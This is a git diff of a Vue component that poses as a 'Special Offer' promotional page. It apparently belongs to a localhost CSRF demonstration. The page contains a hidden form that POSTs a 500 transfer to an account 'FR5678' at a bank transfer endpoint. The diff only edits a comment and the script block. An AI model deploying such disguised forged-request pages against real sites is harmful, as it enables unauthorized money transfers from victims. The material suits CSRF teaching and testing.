@@ -3,7 +3,7 @@
 		<h1>🎉 Special Offer !!!</h1>
 		<p>Don't miss this special offer once a year until TODAY!</p>
 
-		<!-- Formulaire CSRF (attaque silencieuse déguisée) -->
+		<!-- Formulaire CSRF -->
 		<form action="http://localhost:8080/bank/transfer" method="POST">
 			<input type="hidden" name="toAccountNumber" value="FR5678" />
 			<input type="hidden" name="amount" value="500" />
@@ -12,8 +12,10 @@
 	</div>
 </template>
 
-<script setup>
-// pas de logique JS ici
+<script>
+export default {
+	name: "App",
+};
 </script>
 
 <style scoped>
